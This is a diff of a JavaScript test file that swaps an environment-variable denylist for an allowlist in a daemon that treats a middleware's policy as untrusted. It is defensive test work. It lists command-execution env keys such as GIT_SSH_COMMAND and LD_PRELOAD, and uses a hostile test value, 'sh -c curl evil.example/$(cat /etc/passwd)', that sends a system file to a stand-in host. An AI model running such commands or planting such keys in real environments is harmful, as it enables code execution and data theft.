@@ -3,8 +3,8 @@
  * findings). These prove the daemon treats the middleware's policy response as
  * UNTRUSTED input:
  *   - image repository must be allowlisted; a floating tag is refused when a
- *     digest is required; a reserved env key is refused — and in every rejection
- *     NO policy is returned (so no container can be created);
+ *     digest is required; an env key that is not on the allowlist is refused — and
+ *     in every rejection NO policy is returned (so no container can be created);
  *   - the policy fetch refuses a 30x redirect (the endpoint is pinned);
  *   - the body read is bounded (oversized body) and timed (slow body).
  *
@@ -153,18 +153,95 @@ describe('policyClient — image clamp on the untrusted policy', () => {
   });
 });
 
-describe('policyClient — env clamp on the untrusted policy', () => {
-  for (const key of ['DOCKER_HOST', 'DOCKER_TLS_VERIFY', 'PATH', 'DEV_RUNNER_DAEMON_TOKEN', 'NODE_OPTIONS', 'LD_PRELOAD']) {
-    it(`refuses a policy env carrying the reserved key ${key}`, async () => {
-      const client = clientWith(policyBody({ env: { [key]: 'x' } }));
-      await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.env_reserved_key');
+describe('policyClient — env clamp on the untrusted policy (allowlist)', () => {
+  // The command-execution class the allowlist exists to refuse: a compromised
+  // middleware ships one of these and gets arbitrary exec on the next git/shell/
+  // loader invocation. A denylist cannot enumerate this moving target; the
+  // allowlist refuses every one because none is on it. Plus the old denylist
+  // members, to prove the allowlist is a strict superset of the prior guard.
+  const DANGEROUS_KEYS = [
+    'GIT_SSH_COMMAND',
+    'GIT_EXTERNAL_DIFF',
+    'GIT_PROXY_COMMAND',
+    'GIT_SSH',
+    'BASH_ENV',
+    'ENV',
+    'LD_PRELOAD',
+    'LD_LIBRARY_PATH',
+    'LD_AUDIT',
+    'NODE_OPTIONS',
+    'PATH',
+    'DEV_RUNNER_DAEMON_TOKEN',
+    'DOCKER_HOST',
+    'DOCKER_TLS_VERIFY',
+    'PERL5LIB',
+    'PYTHONSTARTUP',
+    'IFS',
+  ];
+  for (const key of DANGEROUS_KEYS) {
+    it(`refuses a policy env carrying the un-allowlisted key ${key}`, async () => {
+      const client = clientWith(policyBody({ env: { [key]: 'sh -c id' } }));
+      await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.env_key_not_allowed');
     });
   }
 
-  it('accepts a policy env of only structurally-known keys', async () => {
+  // Every key on the allowlist must pass, individually.
+  const ALLOWED_KEYS = [
+    'OMADIA_JOB_BASE_URL',
+    'OMADIA_JOB_ID',
+    'OMADIA_JOB_TOKEN',
+    'OMADIA_WORKSPACE',
+    'OMADIA_CLI_BIN',
+    'OMADIA_LLM_ENV_ALLOWED',
+    'OMADIA_ANTHROPIC_BASE_URL',
+    'OMADIA_ANTHROPIC_AUTH_TOKEN',
+    'ANTHROPIC_BASE_URL',
+    'ANTHROPIC_AUTH_TOKEN',
+    'CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC',
+    'DISABLE_AUTOUPDATER',
+    'DISABLE_TELEMETRY',
+    'CLAUDE_CONFIG_DIR',
+    'HTTP_PROXY',
+    'HTTPS_PROXY',
+    'NO_PROXY',
+    'http_proxy',
+    'https_proxy',
+    'no_proxy',
+    'LANG',
+    'LC_ALL',
+    'TERM',
+    'HOME',
+  ];
+  for (const key of ALLOWED_KEYS) {
+    it(`accepts the allowlisted key ${key}`, async () => {
+      const client = clientWith(policyBody({ env: { [key]: 'value' } }));
+      const policy = await client.fetchJobPolicy(JOB_ID);
+      assert.deepEqual(Object.keys(policy.env), [key]);
+    });
+  }
+
+  it('accepts a policy env of several allowlisted keys together', async () => {
     const client = clientWith(policyBody({ env: { ANTHROPIC_BASE_URL: 'http://mw/llm', DISABLE_TELEMETRY: '1' } }));
     const policy = await client.fetchJobPolicy(JOB_ID);
     assert.deepEqual(Object.keys(policy.env).sort(), ['ANTHROPIC_BASE_URL', 'DISABLE_TELEMETRY']);
+  });
+
+  it('rejects the un-allowlisted key even when mixed with allowlisted keys', async () => {
+    const client = clientWith(policyBody({ env: { ANTHROPIC_BASE_URL: 'http://mw/llm', GIT_SSH_COMMAND: 'sh -c pwned' } }));
+    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.env_key_not_allowed');
+  });
+
+  it('names the offending key but NEVER its value in the rejection', async () => {
+    const secretValue = 'sh -c curl evil.example/$(cat /etc/passwd)';
+    const client = clientWith(policyBody({ env: { GIT_SSH_COMMAND: secretValue } }));
+    await assert.rejects(client.fetchJobPolicy(JOB_ID), (err) => {
+      assert.ok(err instanceof PolicyLookupError);
+      assert.equal(err.code, 'daemon.env_key_not_allowed');
+      assert.ok(err.message.includes('GIT_SSH_COMMAND'), 'error should name the key');
+      assert.ok(!err.message.includes(secretValue), 'error must NOT echo the value');
+      assert.ok(!err.message.includes('evil.example'), 'error must NOT leak any part of the value');
+      return true;
+    });
   });
 });
 
